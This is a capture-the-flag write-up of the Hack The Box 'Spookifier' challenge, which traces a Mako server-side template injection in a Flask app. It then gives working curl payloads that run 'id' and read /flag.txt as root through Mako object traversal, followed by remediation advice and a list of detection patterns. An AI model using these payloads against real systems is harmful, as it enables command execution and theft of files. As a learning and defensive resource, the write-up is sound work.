# 🎃 Hack The Box — Spookifier Writeup

> **Category:** Web Exploitation  
> **Difficulty:** Very Easy  
> **Main Vulnerability:** Server-Side Template Injection (SSTI)  
> **Template Engine:** Mako  
> **Impact:** Remote Command Execution inside the challenge container  
> **Status:** Solved  
> **Flag:** `HTB{REDACTED_FOR_PUBLIC_WRITEUP}`

---

## 1. Executive Summary

Spookifier is a Hack The Box web challenge where the application generates a spooky version of a user-provided name. At first glance, the website looks like a simple text transformation app. The user submits a name through the `text` parameter, and the backend returns several spooky-font variations of that input.

After reviewing the provided source code, I found that the application takes user-controlled input, inserts it into an HTML string, and then renders that string again using the Mako template engine:

```python
return Template(result).render()
```

This behavior creates a **Server-Side Template Injection (SSTI)** vulnerability. Because user input is interpreted as template code, an attacker can inject Mako expressions such as `${7*7}` and have them evaluated by the server.

The vulnerability was confirmed when the payload `${7*7}` returned `49`. After that, I used Mako object traversal to access Python functionality and execute system commands inside the lab container. Finally, I read the flag from `/flag.txt`, whose location was identified from the `Dockerfile`.

---

## 2. Challenge Context

The challenge scenario says:

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

This scenario is a hint that the application does more than simply display text. The phrase "magically changed" suggests that user input may be processed in an unsafe or unexpected way.

Target:

```text
http://154.57.164.67:31910
```

---

## 3. Methodology

The approach used in this challenge:

```text
1. Understand normal application behavior
2. Inspect frontend behavior using browser DevTools
3. Review the provided source code
4. Trace user input from request to rendering
5. Identify unsafe template rendering
6. Confirm SSTI with a harmless arithmetic payload
7. Escalate from SSTI to command execution
8. Locate and read the flag
9. Analyze the vulnerability from a defensive perspective
```

The key mindset is simple:

> Do not guess the exploit first. Follow the data flow.

In web security, one of the most important skills is tracking how user input moves through the application.

---

## 4. Initial Reconnaissance

### 4.1 Opening the Application

I first opened the web application in the browser:

```text
http://154.57.164.67:31910/?text=rey
```

The application displayed a Halloween-themed page called **Name Spookifier**. When I submitted a name, it returned several spooky-looking variations of the same input.

Example behavior:

```text
Input  : rey
Output : multiple spooky-font versions of "rey"
```

At this stage, the application seemed like a normal text styling generator.

### 4.2 Browser DevTools Inspection

I opened the browser DevTools and checked the **Network** tab.

Observed requests included:

```text
GET /?text=rey
GET /static/css/bootstrap.min.css
GET /static/css/index.css
GET /static/images/vamp.png
GET /favicon.ico
```

There were no suspicious JavaScript files, hidden APIs, or client-side logic that looked exploitable.

This suggested that the important logic was likely happening on the backend.

**Conclusion from recon:**

```text
The frontend is mostly static.
The interesting behavior is likely server-side.
```

---

## 5. Source Code Review

The challenge provided a downloadable source archive: `Spookifier.zip`.

After extracting it, the project structure looked like this:

```text
.
├── build-docker.sh
├── challenge
│   ├── application
│   │   ├── blueprints
│   │   ├── main.py
│   │   ├── static
│   │   ├── templates
│   │   └── util.py
│   └── run.py
├── config
│   └── supervisord.conf
├── Dockerfile
└── flag.txt
```

Important files:

```text
challenge/application/blueprints/routes.py
challenge/application/util.py
challenge/application/templates/index.html
Dockerfile
```

---

## 6. Tracing User Input

### 6.1 Input Handling in `routes.py`

The main route is defined in `routes.py`:

```python
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html', output=converted)

    return render_template('index.html', output='')
```

The important lines are:

```python
text = request.args.get('text')
converted = spookify(text)
return render_template('index.html', output=converted)
```

This means the application takes user input from the query parameter:

```text
?text=
```

Then passes it into:

```python
spookify(text)
```

So the input flow starts like this:

```text
User input from ?text=
        ↓
routes.py
        ↓
spookify(text)
```

---

## 7. Understanding the Spookify Logic

Inside `util.py`, the `spookify()` function processes the user input:

```python
def spookify(text):
    converted_fonts = change_font(text_list=text)
    return generate_render(converted_fonts=converted_fonts)
```

The function does two things:

```text
1. Converts the input into several spooky font styles
2. Passes the result into generate_render()
```

So the flow becomes:

```text
User input
   ↓
spookify()
   ↓
change_font()
   ↓
generate_render()
```

---

## 8. The Vulnerable Function

The most important function is `generate_render()`:

```python
def generate_render(converted_fonts):
    result = '''
        <tr>
            <td>{0}</td>
        </tr>
        
        <tr>
            <td>{1}</td>
        </tr>
        
        <tr>
            <td>{2}</td>
        </tr>
        
        <tr>
            <td>{3}</td>
        </tr>

    '''.format(*converted_fonts)
    
    return Template(result).render()
```

The dangerous line is:

```python
return Template(result).render()
```

This is the root cause of the vulnerability.

The application first creates an HTML string using user-controlled data, then renders that string again as a Mako template.

This means if user input contains Mako template syntax, the server may evaluate it.

---

## 9. Vulnerability Explanation

### 9.1 What is Server-Side Template Injection?

Server-Side Template Injection, or SSTI, happens when user-controlled input is processed by a server-side template engine as template code.

A template engine is normally used to generate dynamic HTML.

For example:

```mako
Hello, ${name}
```

If `name` is `rey`, the output becomes:

```text
Hello, rey
```

That is normal and safe when the template itself is controlled by the developer.

The danger happens when the user can control the template content itself.

In this challenge, the application effectively does this:

```python
Template(user_controlled_data).render()
```

That means user input is not treated only as text. It can be treated as executable template syntax.

### 9.2 Simple Analogy

Imagine a restaurant where customers write their name on a paper.

Normal behavior:

```text
Customer writes: Rey
Waiter prints: Rey
```

Unsafe behavior:

```text
Customer writes: ${7*7}
Waiter does not print it as text.
Waiter calculates it and prints: 49
```

That is what happened here.

The server should only display the user input, but instead it interprets the input as instructions.

---

## 10. Confirming the Vulnerability

To safely test whether the server evaluates template expressions, I used a harmless arithmetic payload:

```text
${7*7}
```

Command:

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${7*7}' \
  | grep -o "49"
```

Output:

```text
49
```

This confirms that the expression was evaluated server-side.

If the application were safe, it would display `${7*7}` as plain text. Instead, it returned `49`, proving that the Mako template engine executed the expression.

**Checkpoint result:**

```text
Input  : ${7*7}
Output : 49
Result : SSTI confirmed
```

---

## 11. From SSTI to Command Execution

After confirming SSTI, the next step was to understand whether the template context allowed access to Python internals.

A known Mako object traversal payload can access Python functionality through the template object:

```mako
${self.module.cache.util.os.popen("id").read()}
```

The command used:

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${self.module.cache.util.os.popen("id").read()}'
```

Relevant output:

```text
uid=0(root) gid=0(root) groups=0(root),...
```

This confirmed command execution inside the challenge container.

**Checkpoint result:**

```text
Input  : ${self.module.cache.util.os.popen("id").read()}
Output : uid=0(root) gid=0(root) groups=0(root),...
Result : Command execution confirmed
```

---

## 12. Locating the Flag

To avoid guessing the flag location, I checked the `Dockerfile`.

Relevant line:

```dockerfile
COPY flag.txt /flag.txt
```

This tells us that during container build, the flag file is copied into:

```text
/flag.txt
```

So the target file is known from the source code.

**Checkpoint result:**

```text
Dockerfile shows: COPY flag.txt /flag.txt
Flag location  : /flag.txt
```

---

## 13. Retrieving the Flag

After confirming command execution and identifying the flag location, I used the SSTI payload to read `/flag.txt`.

Command:

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${self.module.cache.util.os.popen("cat /flag.txt").read()}' \
  | grep -oE 'HTB\{[^}]+\}'
```

Output:

```text
HTB{REDACTED_FOR_PUBLIC_WRITEUP}
```

For a public portfolio writeup, it is better to redact the full flag.

---

## 14. Complete Attack Flow

```text
1. Open the application
2. Identify the text query parameter
3. Inspect frontend behavior
4. Find no suspicious client-side logic
5. Extract and review source code
6. Locate input handling in routes.py
7. Trace input into spookify()
8. Review generate_render()
9. Discover Template(result).render()
10. Confirm SSTI using ${7*7}
11. Confirm command execution using id
12. Check Dockerfile for flag location
13. Read /flag.txt
14. Retrieve the flag
```

---

## 15. Why the Exploit Works

The vulnerability exists because the application renders user-controlled content as a template.

The insecure flow:

```text
User input
   ↓
Inserted into HTML string
   ↓
HTML string passed to Mako Template()
   ↓
Mako evaluates template expressions
   ↓
User payload executes
```

The unsafe code:

```python
return Template(result).render()
```

The server interprets this input:

```mako
${7*7}
```

As a Mako expression.

So the result becomes:

```text
49
```

The same behavior allows more advanced payloads that access Python objects and execute commands.

---

## 16. Security Impact

The impact is serious.

An attacker who can inject template syntax can potentially:

```text
- Read local files
- Execute system commands
- Access environment variables
- Leak secrets
- Enumerate the container
- Compromise the application runtime
```

In this challenge, the impact was demonstrated by reading:

```text
/flag.txt
```

In a real production environment, similar vulnerabilities could expose:

```text
- API keys
- Database credentials
- Session secrets
- Internal service tokens
- Cloud metadata
- Application source code
```

---

# 🛡️ 17. Blue Team Perspective

From a defender's point of view, this challenge is not only about exploitation. It also teaches how to prevent and detect insecure template rendering.

## 17.1 Root Cause

The root cause is unsafe template rendering:

```python
Template(result).render()
```

Where `result` contains user-controlled data.

This violates a core secure coding principle:

> User input must be treated as data, not executable code.

## 17.2 Secure Fix

The application does not need to render `result` again as a Mako template.

Instead of:

```python
return Template(result).render()
```

A safer approach would be:

```python
return result
```

The output should be treated as plain data, not as a template.

## 17.3 Escape User-Controlled Output

When displaying user-controlled content in HTML, output encoding should be applied.

Example secure mindset:

```text
User input should be escaped before being inserted into HTML.
```

This helps prevent:

```text
- SSTI
- XSS
- HTML injection
```

Depending on the framework and template engine, developers should use built-in escaping features instead of manually building HTML strings.

## 17.4 Avoid Building HTML with String Formatting

This pattern is risky:

```python
'''
<tr>
    <td>{0}</td>
</tr>
'''.format(user_input)
```

A safer approach is to keep HTML inside template files and pass variables safely through the template engine.

Instead of generating HTML manually in Python, the app should let the template file handle presentation.

## 17.5 Principle of Least Privilege

The command execution output showed the application running as root:

```text
uid=0(root)
```

That increases the impact of any vulnerability.

In production, the application should run as a low-privileged user.

Recommended controls:

```text
- Do not run web applications as root
- Use a dedicated non-root container user
- Apply read-only filesystem where possible
- Restrict access to sensitive files
- Use AppArmor, SELinux, or seccomp profiles
- Avoid placing secrets directly in the filesystem
```

## 17.6 Detection Opportunities

Blue teams can monitor for suspicious template payloads in HTTP logs.

Examples of suspicious patterns:

```text
${7*7}
${self.module
os.popen
subprocess
__class__
__mro__
__subclasses__
```

Possible detection logic:

```text
Alert when query parameters contain template syntax such as ${...}
Alert when payloads contain references to Python internals
Alert when HTTP requests include command execution keywords
```

Example suspicious request:

```text
GET /?text=${7*7}
GET /?text=${self.module.cache.util.os.popen("id").read()}
```

## 17.7 Hardening Checklist

Recommended remediations:

```text
[ ] Never render user input as a template
[ ] Remove Template(result).render()
[ ] Escape all user-controlled output
[ ] Avoid manual HTML string formatting
[ ] Keep HTML inside template files
[ ] Run the application as a non-root user
[ ] Add server-side input validation
[ ] Monitor logs for SSTI payloads
[ ] Use dependency scanning
[ ] Add security tests for template injection
```

---

## 18. Lessons Learned

This challenge teaches several important lessons:

```text
1. Frontend inspection alone is not enough.
2. Source code review is powerful when available.
3. User input tracing helps reveal hidden vulnerabilities.
4. Template engines can become dangerous when user input is rendered as template code.
5. A harmless arithmetic payload is a safe way to confirm SSTI.
6. Dockerfile review can reveal important runtime details.
7. Defensive thinking is as important as exploitation.
```

---

## 19. Final Conclusion

The Spookifier challenge was vulnerable to **Server-Side Template Injection** because user-controlled input was inserted into an HTML string and then rendered again using Mako's `Template(result).render()`.

The vulnerability was confirmed using the payload:

```mako
${7*7}
```

which returned:

```text
49
```

After confirming SSTI, command execution was achieved through Mako object traversal. The flag location was discovered in the `Dockerfile`, where `flag.txt` was copied to `/flag.txt`. Finally, the flag was retrieved by reading that file through the SSTI payload.

This challenge demonstrates how a small mistake in template rendering can escalate into full command execution. From a blue team perspective, the correct mitigation is to never render user-controlled input as template code, apply output encoding, avoid running applications as root, and monitor logs for template injection patterns.

---

## 20. Key Takeaway

> The application did not simply display the user's spooky name.  
> It accidentally treated the user's input as template code.  
> That mistake turned a harmless name generator into a command execution vulnerability.

---

## Appendix — Commands Used

### Test normal input

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=rey'
```

### Confirm SSTI

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${7*7}' \
  | grep -o "49"
```

### Confirm command execution

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${self.module.cache.util.os.popen("id").read()}'
```

### Read flag

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${self.module.cache.util.os.popen("cat /flag.txt").read()}' \
  | grep -oE 'HTB\{[^}]+\}'
```

---

